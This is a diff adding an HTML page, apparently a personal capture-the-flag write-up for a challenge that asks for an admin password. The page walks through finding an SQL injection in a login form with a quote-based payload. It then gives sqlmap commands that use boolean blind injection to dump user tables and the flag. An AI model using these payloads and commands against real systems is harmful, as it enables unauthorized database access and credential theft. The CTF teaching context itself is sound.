@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>J.A</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">  </head>
+  <body>
+    <a href="/">home></a>
+    <h3> KITS CTF 4 SECFEST</h3>
+    <h2> Challenge 2</h2>
+    <p> Like challenge 1, the goal of this challenge is to find the admin password for the login page.</p>
+    <p> Inspecting the form we see that authentication is not performed clientside in contrast to challenge 1,
+        instead sending username and password to a php program <code>login.php</code>, which then communicates back via http status code. 
+     </p>
+
+    <p>
+        A hint on the page tells us to try "guest" "guest" as a login, which grants us access to the guest account.
+        Whats strange is that the login seems to be case-insensitive with logins "gUeSt" and "GuEsT" both still resulting in succsefull authentication.
+        Also, adding "\" into the username and password seems to not affect the result (example "gue\st").
+    </p>
+
+    <p> 
+        Something is strange with <code>login.php</code>, so lets try sql injection.
+        After testing some usual strings, I found this:
+    </p>
+
+    <code>username: admin' or '1' = '1 ; passowrd: guest</code> resulted in a succsesfull login as guest while
+    <br>
+    <code>username: admin' or '1' = '0 ; passowrd: guest</code> resulted in an unsuccessfull login.
+
+    <p> The good news is that we have found an sql-injection vulnerability!
+        The bad news is that since the server only responds in http status codes we can only get yes/no results from our querys.
+        The solution is <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">blind sql injection</a> where we
+        can extract information via a series of true or false questions.
+    </p>
+
+    <p>Doing this by hand is something I would like to avoid, so since the ctf allows for automated tools I will use <code>sqlmap</code> to find the password.</p>
+
+    <p>After creating a http request file for sqlmap to detect the multipart form which contains the vulnerability, I ran the following command:</p>
+    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 --dump</code>
+    <p>The important parts:</p>
+    <ul>
+        <li><code>--delay=0.1</code> throttles requests made by sqlmap to 10 every second (While the ctf rules did not say anything about how many requests we were allowed to perform per second, I wanted to be polite)</li>
+        <li><code>-p username</code> the data field that contains the sql injection vulnerability</li>
+        <li><code>--ignore-code=403 --code 200</code> tell sqlmap to ignore http error codes, and treat http code 200 as the sql query evaluating to true </li>
+        <li><code>--dump</code> give us info about the sql server </li>
+    </ul>
+
+    <p>sqlmap found our injection easily, reporting it as <code>AND boolean-based blind - WHERE or HAVING clause</code></p>
+    <p> It also reported that the sql server is a MariaDB server version 5</p>
+    
+    <p>
+        Reruning with the <code>--dbs</code> and <code>--tables</code> options we find that there exists a database by name "ctf" and a table called "kitsctf2".
+        For some reason sqlmap had a difficult time finding the column names of the table, but guessing that they are the same as the field names, "username","password", we can get all rows via:<br>
+        <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 -D ctf -T kitsctf2 -C username,password --dump</code><br>
+        I let it run for a while, and came back to this:
+        <pre>
++-----------------+----------+
+| username        | password |
++-----------------+----------+
+| tinywolf833     | 1011     |
+| brownkoala841   | 102030   |
+| whitegorilla800 | 1112     |
+| goldentiger612  | 1200     |
+| lazylion642     | 12345678 |
++-----------------+----------+
+        </pre>
+        Testing these logins resulted in a succsefull login as that user, but each row takes a while to gather and since time was running out i needed a faster way to find the admin key.
+    </p>
+    <p>
+        Replacing <code>--dump</code> with <code>--count</code> we see that there are 202 rows in the table
+        This would take a long time to dump, but since we know that the password has to start with a capital K (from the flag format), we only need to check the first letter of every row!!
+        Once we have found a row with a password starting with "K" we can then extract the entire password.
+    </p>
+    This was done with the command:
+    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 --dbms=mysql -D ctf -T kitsctf2 -C password --first 1 --last 1 --dump</code>
+    The output is saved in a text file, which we can then use <code>grep -n K</code> to get the row number which was 105.
+
+    then we use a slightly modified sqlmap command to get the loggin info:
+
+    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200  --fresh-queries --dbms=mysql -D ctf -T kitsctf2 -C username,password --start 104 --stop 106 --dump</code>
+
+    <p>Here we extract row 104-106, to account for any errors when finding the row. Note the <code>--fresh-queries</code> which was needed because sqlmap would present the single character results instead of the full password.</p>
+
+    The resulting table given by sqlmap:
+
+
+    <pre>
++---------------+-----------------------------+
+| username      | password                    |
++---------------+-----------------------------+
+| bigmouse509   | KITS{K1T5_&lt;3_5ecur1ty_f3sT} |
+| blueduck186   | knockers                    |
+| crazygoose390 | kojak                       |
++---------------+-----------------------------+
+    </pre>
+
+    And with that we have solved challenge 2!
+
+  </body>
+</html>
